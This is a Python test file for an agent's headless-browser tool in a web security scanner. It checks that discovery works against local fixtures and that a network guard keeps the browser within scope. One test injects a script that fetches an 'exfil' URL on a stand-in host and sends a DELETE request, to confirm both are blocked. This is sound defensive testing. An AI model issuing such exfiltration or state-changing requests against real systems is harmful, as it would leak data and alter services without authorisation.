"""The browser as an agent tool: a real headless Chromium against the controlled SPA and SSO fixtures.

What is asserted is the security contract as much as the discovery:

* JavaScript-only functionality and API calls become surface (SPA fixture);
* interaction (fill + click) logs in, the identity's cookie jar persists across
  calls, and an object page's API call is observed with its JSON body fields;
* EVERY request the page made was answered by the guarded client (recorded), the
  browser itself never reached the network;
* out-of-scope requests, state-changing methods and WebSockets are refused and
  reported; an IdP redirect is reported as an authentication boundary and the IdP
  is never contacted.
"""
from __future__ import annotations

import pytest

from src.greybox_web.netguard import Budget, GuardedHttpClient, NetPolicy
from src.greybox_web.scope import PolicyContext, build_scope
from src.greybox_web.tools import ToolContext
from src.greybox_web.tools import browser
from tests.greybox_web.fixtures import idp_app, spa_app

pytestmark = [pytest.mark.slow, pytest.mark.skipif(not browser.available(),
                                reason="Playwright is not installed")]


class Rec:
    def __init__(self) -> None:
        self.rows = []

    async def record(self, ex):
        self.rows.append(ex)
        return len(self.rows)


@pytest.fixture(scope="module")
def spa():
    server, url = spa_app.serve()
    yield url
    server.should_exit = True


@pytest.fixture(scope="module")
def idp():
    server, url = idp_app.serve()
    yield url
    server.should_exit = True


def _ctx(base: str, *, cookie=None, params=None, run_id="r1", extra_scope=None):
    _, scope, errs = build_scope(base, extra_scope or {},
                                 PolicyContext(allow_private=True))
    assert not errs, errs
    rec = Rec()
    client = GuardedHttpClient(scope=scope, budget=Budget(400, 120),
                               policy=NetPolicy(allow_private=True), recorder=rec,
                               cookie_header=cookie, rate_limit_rps=100)
    http = client.bind("browser.visit")
    return ToolContext(http=http, base_url=base, scope=scope, limits={},
                       params=params or {}, run_id=run_id), rec, client


async def _close(run_id, client):
    await browser.close_run(run_id)
    await client.aclose()


async def test_spa_functionality_is_discovered_only_by_executing_it(spa):
    spa_app.reset_counts()
    ctx, rec, client = _ctx(spa, run_id="spa-1")
    try:
        res = await browser.visit(ctx)
    finally:
        await _close("spa-1", client)
    urls = {p.url for p in res.pages}
    api = {p.url for p in res.pages if p.data.get("api")}
    # the bundle's first fetch, invisible in the HTML shell
    assert spa + "api/notes" in api, res.summary
    # the unauthenticated user is routed to the client-side login view
    obs = res.observations[0].facts
    assert "Sign in" in obs["text_excerpt"] and obs["identity"] == "anon"
    assert spa + "static/app.js" in urls or any("app.js" in r.url for r in rec.rows)
    # every request the page made went through the guard, nothing else reached
    # the server: the fixture saw exactly what the guard recorded
    recorded = [r for r in rec.rows if not r.blocked]
    assert recorded and all(r.tool == "browser.visit" for r in recorded)
    seen = spa_app.counts()
    assert sum(seen.values()) == len(recorded), (seen, [r.url for r in recorded])


async def test_interaction_logs_in_and_the_identity_persists(spa):
    spa_app.reset_counts()
    ctx, rec, client = _ctx(spa, run_id="spa-2", params={
        "url": spa + "#/login",
        "actions": [{"kind": "fill", "selector": "#u", "value": "ana"},
                    {"kind": "fill", "selector": "#p", "value": "ana-pass"},
                    {"kind": "click", "selector": "#go"}]})
    try:
        res = await browser.act(ctx)
        login = next(p for p in res.pages if p.url == spa + "api/session")
        assert "POST" in login.data["methods"]
        assert {"username", "password"} <= {x.name for x in login.params}
        assert any("POST /api/session" in a for a in res.observations[0].facts["actions"])
        # same run, same identity: the session cookie is still in the jar
        ctx.params.clear()
        ctx.params.update({"url": spa + "#/notebooks/3"})
        res2 = await browser.visit(ctx)
        assert spa + "api/notes/3" in {p.url for p in res2.pages}, res2.summary
        assert "private notebook of bruno" in res2.observations[0].facts["text_excerpt"]
        # cookie names and flags, never values
        ctx.params.clear()
        res3 = await browser.cookies(ctx)
        names = [c["name"] for c in res3.observations[0].facts["cookies"]]
        assert names == ["sid"]
        assert "ana:" not in str(res3.observations[0].facts)
    finally:
        await _close("spa-2", client)


async def test_page_cannot_leave_scope_change_state_or_open_websockets(spa):
    ctx, rec, client = _ctx(spa, run_id="spa-3", params={
        "url": spa + "#/login",
        "actions": [{"kind": "script", "value":
                     "() => Promise.allSettled(["
                     "fetch('http://127.0.0.2:9/exfil?x=1'),"
                     "fetch('http://example.com/'),"
                     "fetch('/api/notes/1', {method: 'DELETE'}),"
                     "new Promise(r => { const w = new WebSocket("
                     "'ws://' + location.host + '/ws'); w.onclose = r; w.onerror = r;"
                     " setTimeout(r, 1500); })"
                     "]).then(rs => rs.map(r => r.status))"}]})
    try:
        res = await browser.act(ctx)
    finally:
        await _close("spa-3", client)
    facts = res.observations[0].facts
    reasons = {b["reason"] for b in facts["blocked"]}
    assert {"host_not_allowed", "state_changing_not_allowed"} <= reasons, facts["blocked"]
    assert facts["websockets_refused"], facts
    # the refused DELETE is in the audited traffic as a block, never sent
    assert any(r.method == "DELETE" and r.blocked for r in rec.rows)
    assert not any(r.host in ("example.com", "127.0.0.2") and not r.blocked
                   for r in rec.rows)


async def test_expired_session_reaches_the_idp_boundary_not_the_idp(idp):
    idp_app.reset_counts()
    ctx, rec, client = _ctx(idp + "app/", cookie="sid=stale-session",
                            run_id="idp-1", params={"url": idp + "app/"})
    try:
        res = await browser.visit(ctx)
    finally:
        await _close("idp-1", client)
    facts = res.observations[0].facts
    assert facts["auth"]["state"] == "identity_provider", facts
    assert facts["auth"]["provider"] == idp_app.IDP_HOST
    assert res.pages[0].data["auth_state"]["state"] == "identity_provider"
    assert "AUTH: identity_provider" in res.summary
    # the identity provider was never contacted, and its page never analysed
    assert not any(r.host == idp_app.IDP_HOST and not r.blocked for r in rec.rows)
    assert "Sign in to your account" not in facts["text_excerpt"]


async def test_valid_session_reaches_the_application(idp):
    ctx, rec, client = _ctx(idp + "app/", cookie="sid=alice-session",
                            run_id="idp-2", params={"url": idp + "app/"})
    try:
        res = await browser.visit(ctx)
    finally:
        await _close("idp-2", client)
    facts = res.observations[0].facts
    assert "auth" not in facts and facts["identity"] == "provided-cookie"
    assert facts["final_url"].startswith(idp + "app")


def test_urls_keep_their_query_string():
    assert browser._clean_url("http://a.test/x?q=1#frag") == "http://a.test/x?q=1"


async def test_unsupported_action_is_refused_loudly(spa):
    ctx, rec, client = _ctx(spa, run_id="spa-4", params={
        "actions": [{"kind": "hover", "selector": "#x"}]})
    try:
        res = await browser.act(ctx)
    finally:
        await _close("spa-4", client)
    assert "unsupported action kind" in res.summary and not rec.rows
